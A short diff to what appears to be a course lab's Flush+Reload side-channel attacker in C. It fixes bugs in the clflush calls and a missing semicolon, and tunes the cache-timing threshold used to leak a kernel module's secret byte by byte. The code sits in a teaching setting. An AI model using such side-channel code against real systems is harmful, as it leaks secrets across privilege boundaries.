@@ -40,7 +40,7 @@ static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t 
 int run_attacker(int kernel_fd, char *shared_memory) {
     char leaked_str[LAB2_SECRET_MAX_LEN];
     size_t current_offset = 0;
-    uint64_t threshold = 150; 
+    uint64_t threshold = 170; 
 
 
     printf("Launching attacker\n");
@@ -52,7 +52,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
         // Step1 : Flush the shared memory 
         for (int block = 0; block < 256; block++) {
 
-            Clflush(shared_memory + (LAB2_PAGE_SIZE * block));
+            clflush(shared_memory + (LAB2_PAGE_SIZE * block));
         }
 
         // step2 : call the victim 
@@ -60,10 +60,10 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         // Step3 : read the cache to retrieve the secret byte
         for (int block = 0; block < 256; block++) {
-            access_time = time_access(shared_memory + (LAB2_PAGE_SIZE * block))
+            access_time = time_access(shared_memory + (LAB2_PAGE_SIZE * block));
             if (access_time < threshold) {
                 leaked_byte = (char)block; 
-                Clflush(shared_memory + (LAB2_PAGE_SIZE * block));
+                clflush(shared_memory + (LAB2_PAGE_SIZE * block));
             }
         }
 
